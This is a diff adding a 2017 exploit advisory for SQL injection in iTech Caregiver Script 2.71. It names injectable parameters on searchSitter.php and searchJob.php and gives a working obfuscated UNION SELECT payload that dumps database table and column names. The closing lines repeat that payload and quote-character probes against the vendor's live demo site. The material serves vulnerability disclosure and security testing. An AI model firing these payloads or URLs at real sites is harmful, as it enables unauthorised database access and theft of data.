@@ -1,0 +1,67 @@
+# # # # #
+# Exploit Title: iTech Caregiver Script 2.71 - SQL Injection
+# Dork: N/A
+# Date: 18.08.2017
+# Vendor Homepage : http://itechscripts.com/
+# Software Link: http://itechscripts.com/caregiver-script/
+# Demo: http://caregiver.itechscripts.com/
+# Version: 2.71
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+#
+# Proof of Concept:
+#
+# http://localhost/[PATH]/searchSitter.php?myCity=[SQL]
+# -1'+/*!22222union*/+/*!22222select*/+(sELECT+eXPORT_sET(0x35,@:=0,(sELECT+cOUNT(*)fROM(iNFORMATiON_sCHEMA.cOLUMNS)wHERE@:=eXPORT_sET(0x35,eXPORT_sET(0x35,@,tABLE_nAME,0x3c6c693e,2),cOLUMN_nAME,0xa3a,2)),@,0x32))--+-
+#
+# http://localhost/[PATH]/searchSitter.php?sitterService=[SQL]
+#
+# http://localhost/[PATH]/searchSitter.php?age=[SQL]
+#
+# http://localhost/[PATH]/searchSitter.php?gender=[SQL]
+#
+# http://localhost/[PATH]/searchSitter.php?lastLoginElapsedInDays=[SQL]
+#
+# http://localhost/[PATH]/searchSitter.php?yearsOfExperience=[SQL]
+#
+# http://localhost/[PATH]/searchSitter.php?collegeLevel=[SQL]
+#
+# http://localhost/[PATH]/searchSitter.php?fullPartTime=[SQL]
+#
+# http://localhost/[PATH]/searchSitter.php?liveInOut=[SQL]
+#
+# http://localhost/[PATH]/searchJob.php?sitterService=[SQL]
+#
+# http://localhost/[PATH]/searchJob.php?jobType=[SQL]
+#
+# http://localhost/[PATH]/searchJob.php?jobFrequency=[SQL]
+#
+# Etc...
+# # # # #
+
+
+
+
+
+
+http://caregiver.itechscripts.com/searchSitter.php?myCity=-1'+/*!22222union*/+/*!22222select*/+(sELECT+eXPORT_sET(0x35,@:=0,(sELECT+cOUNT(*)fROM(iNFORMATiON_sCHEMA.cOLUMNS)wHERE@:=eXPORT_sET(0x35,eXPORT_sET(0x35,@,tABLE_nAME,0x3c6c693e,2),cOLUMN_nAME,0xa3a,2)),@,0x32))--+-
+http://caregiver.itechscripts.com/searchSitter.php?sitterService=1'
+http://caregiver.itechscripts.com/searchSitter.php?myCity=1'
+http://caregiver.itechscripts.com/searchSitter.php?age=1'
+http://caregiver.itechscripts.com/searchSitter.php?gender=1'
+http://caregiver.itechscripts.com/searchSitter.php?lastLoginElapsedInDays=1'
+http://caregiver.itechscripts.com/searchSitter.php?yearsOfExperience=1'
+http://caregiver.itechscripts.com/searchSitter.php?collegeLevel=1'
+http://caregiver.itechscripts.com/searchSitter.php?fullPartTime=1'
+http://caregiver.itechscripts.com/searchSitter.php?liveInOut=1'
+http://caregiver.itechscripts.com/searchJob.php?sitterService=2'
+http://caregiver.itechscripts.com/searchJob.php?jobType=2'
+http://caregiver.itechscripts.com/searchJob.php?jobFrequency=2'
